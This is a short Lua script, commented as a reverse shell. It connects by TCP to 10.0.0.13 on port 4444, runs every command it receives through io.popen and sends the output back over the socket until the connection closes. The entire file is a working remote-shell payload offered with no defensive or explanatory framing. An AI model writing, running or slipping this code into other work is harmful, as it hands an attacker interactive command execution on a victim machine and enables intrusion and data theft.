-- Lua reverse shell
local socket = require("socket")
local s = socket.tcp()
s:connect("10.0.0.13", 4444)
while true do
    local cmd, status = s:receive()
    if status == "closed" then break end
    local f = io.popen(cmd, 'r')
    local out = f:read("*a")
    f:close()
    s:send(out)
end
s:close()
